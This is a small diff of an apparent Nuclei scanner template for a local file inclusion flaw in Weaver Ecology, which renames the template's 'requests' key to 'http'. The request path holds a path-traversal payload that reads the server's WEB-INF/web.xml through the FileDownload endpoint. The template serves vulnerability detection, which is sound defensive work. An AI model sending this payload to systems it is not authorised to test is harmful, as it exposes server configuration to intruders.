@@ -4,7 +4,8 @@ info:
   author: princechaddha
   severity: medium
   tags: ecology,lfi
-requests:
+
+http:
   - method: GET
     path:
       - "{{BaseURL}}/weaver/ln.FileDownload?fpath=../ecology/WEB-INF/web.xml"
